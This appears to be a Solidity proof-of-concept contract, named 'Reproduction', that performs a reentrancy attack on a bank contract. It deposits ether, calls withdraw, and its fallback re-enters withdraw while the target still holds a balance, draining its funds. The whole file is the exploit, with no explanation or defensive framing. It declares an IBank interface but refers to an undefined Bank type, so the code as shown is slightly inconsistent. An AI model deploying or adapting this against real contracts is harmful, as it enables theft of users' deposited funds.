interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    Bank public target;

    constructor(address _target) {
        target = Bank(_target);
    }

    function setup() external payable {
        target.deposit{value: msg.value}();
    }

    function trigger(uint amount) external {
        target.withdraw(amount);
    }

    fallback() external payable {
        if (address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }
}